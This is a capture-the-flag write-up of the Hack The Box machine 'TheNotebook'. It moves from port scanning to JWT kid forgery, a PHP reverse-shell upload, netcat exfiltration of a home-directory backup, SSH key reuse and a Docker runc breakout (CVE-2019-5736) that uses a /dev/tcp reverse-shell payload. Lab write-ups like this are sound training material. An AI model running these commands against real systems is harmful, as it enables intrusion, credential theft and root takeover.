---
layout: single
title: "HTB - TheNotebook"
last_modified_at: 2021-07-08 01:00:00 -0700
categories: writeups
tags: [HTB]
share: true
date: 2021-07-08 01:00:00 -0700
toc: true
toc_label: "Table of Contents"
classes: wide
---
![TheNotebook Logo](/assets/images/writeups/htb_notebook.png){: .align-center}

**URL**: <https://app.hackthebox.eu/machines/320> \
**IP**: 10.10.10.230 \
**Completed on**: July 8, 2021 \
**Time to Complete**: 1.5 hours \
**OS**: Linux \
**Difficulty**: Medium

## Summary
The Hack The Box machine, TheNotebook, allows us to explore misconfigurations within JWT tokens, which chained with an unrestricted file upload of php files, allows remote access to the machine. From here, I had to first privilege escalate to a user, which could be done by improper access control to the `/var/backups` directory, which led to access to ssh keys of the user. To get root privileges on the machine, I identified an older version of docker binary being utilized and per a misconfigured sudo privileges I was able to exploit CVE-2019-5736.

## Enumeration

### Full Port Scan
Nmap command: `nmap -p 0-65535 --min-rate=1000 -T4 10.10.10.230`

Output:
```bash
Nmap scan report for notebook.htb (10.10.10.230)
Host is up (0.029s latency).
Not shown: 65533 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi
```

### Version and Default Script Scan

Nmap command: `nmap -T4 -sV -sC -p 22,80,10010 10.10.10.230`

Output:
```bash
Nmap scan report for notebook.htb (10.10.10.230)
Host is up (0.018s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Port 80 - Nginx server
#### Manual Interaction

Navigating to the site (<http://10.10.10.230/>), I am redirected to `/login` path and asked to login:

![Notebook login](/assets/images/writeups/notebook_login.png)

Inserting random username and password, I am able to identify valid usernames through the login error messages. Through this, I identified that `admin` was a valid username:

![Notebook login error](/assets/images/writeups/notebook_loginerror.png)

To check if I can attempt a brute force attack, I attempted to pass several passwords for `admin` account and there was no account lockout in place. Looking over the source code, I can identify that a POST request is being sent with credentials passed through the HTTP request body:

![Notebook login source code](/assets/images/writeups/notebook_loginpost.png)

#### Directory Brute Force

Using gobuster, I attempted a directory brute force attack and identified four files under the web root directory:

Command: `gobuster dir -u http://10.10.10.230/ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

Output:
```
/admin                (Status: 403) [Size: 9]
/login                (Status: 200) [Size: 1250]
/logout               (Status: 302) [Size: 209] [--> http://10.10.10.230/]
/register             (Status: 200) [Size: 1422] 
```

With the found assets I moved to the attack stage to get initial access to the machine.

## Initial Foothold

### Login Brute Force

I used the following hydra command to attempt to brute force the password:
`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.230 http-post-form "/login:username=^USER^&password=^PASS^:Incorrect Password"`

After ~15m, no valid passwords were found.

### Account Registration

Routing to `/register` file, I was prompted to register an account. I registered a test account (`test@test.htb`:`test`) and was given a JSON Web Token cookie.

Placing the web token into <https://jwt.io> to see the decoded output, I identified there is a payload element for `admin_cap` and header element for `kid` (Key ID Header).

![Decoded JWT](/assets/images/writeups/notebook_jwt.png)

### JWT overwrite

Looking over [Ishara's Medium post about exploiting kid to privilege escalate](https://isharaabeythissa.medium.com/jwt-exploit-kid-privilege-escalation-done-by-ishara-abeythissa-154e24b4da8f), I identified that the key ID is used to encode the JWS (JSON Web Signature). Since it's pointing to localhost, I can supply my own private key and set `admin_cap` to true.

```bash
openssl genrsa -out privKey.key 2048
cat privKey.key | xclip -selection c #Places content of private key to clipboard
python3 -m http.server 7070
```

Now in jwt.io I swapped the `kid`, `admin_cap`, and paste the content of our private_key. This will generate a valid encoded JWT on the left:

![Overwriting JWT](/assets/images/writeups/notebook_jwtoverwrite.png)

Now I copied the encoded JWT and overwrote the JWT cookie using Dev Tools. After refreshing the page, I got access to the Admin Panel:

![Overwritten JWT and Admin access](/assets/images/writeups/notebook_overwriteadmin.png)

### Enumerating Admin Panel

Enumerating the admin panel I  identified the following things:
* Site allows PHP execution.
* Site has regular backups
* Valid users: noah (61c9fba6-7434-4edd-845b-0f5156ae6bf7), admin (83b34009-7124-498b-b355-2ea95c512eb8)
* Valid fullname: Nicholas Sparks (noah)
* Site allows file upload

### Reverse PHP Shell

Using the file upload function, I created, modified, and uploaded a reverse shell php and captured it using netcat:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
vim revshell.php
sudo nc -nlvp 443
```

![Uploading reverse php file](/assets/images/writeups/notebook_uploadphp.png)

![Netcat capturing reverse php call](/assets/images/writeups/notebook_phpshell.png)

I got access to `www-data` account, enumerating valid usernames, I found `noah` and `root` are valid accounts.

## Privilege Escalation to Noah

### Backups

Reviewing backup files, I see that `/home` has a backup that we can read within `/var/backups`, I sent this to my kali box using netcat:

```bash
# Local Machine
nc -nvlp 9090 > home.tar.gz
# Remote Machine
cd /var/backups
nc -w 3 10.10.16.26 9090 < home.tar.gz
```

### Decompressing home backup

After decompressing the file (`tar -xf`), we get access to noah's home directory. Which has an ssh private and public key. Let's use this to ssh as noah:

```bash
cp home/noah/.ssh/id_rsa .
ssh -i id_rsa noah@notebook.htb
```

Now we have ssh access as noah. Let's proceed to privilege escalate.

## Privilege Escalation to root

### Sudo privileges

Running a few basic enumeration commands, we identify that `noah` can run a certain command as root: (`sudo -l`)
```bash
User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```

Running `docker --version` we can verify that docker is running on an older version (newest is 20.10), which has a known breakout vulnerability (CVE-2019-5736) which requires `sudo docker exec` access:
```
Docker version 18.06.0-ce, build 0ffa825
```

### CVE-2019-5736

More details on the vulnerably can be found in [Palo Alto](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/). 

Following <https://github.com/Frichetten/CVE-2019-5736-PoC> , we will create a `sh` binary that will overwrite /bin/sh on the docker instance. This will let us elevate to a root shell.

```bash
# Local Machine - Window 1
wget https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go
vim main.go
# Edit the following line:
# var payload = "#/bin/bash \n bash -i >& /dev/tcp/10.10.16.26/443 0>&1"
go build main.go
python3 -m http.server 8000
# Local Machine - Window 2
nc -nvlp 443

# Remote Machine - Window 1
sudo docker exec -it webapp-dev01 bash
cd /tmp
wget 10.10.16.26:8000/main # REPLACE with your IP
chmod +x main
./main
# Expected Output:
# [+] Overwritten /bin/sh successfully
# [+] Found the PID: 7993
# [+] Successfully got the file handle
# [+] Successfully got write handle &{0xc000392060}

# Remote Machine - Window 2
sudo docker exec -it webapp-dev01 /bin/sh # This make 
```

![Exploiting CVE-2019-5736](/assets/images/writeups/notebook_dockerexploit.png)

A root reverse shell was captured through netcat and I got access to `root` user.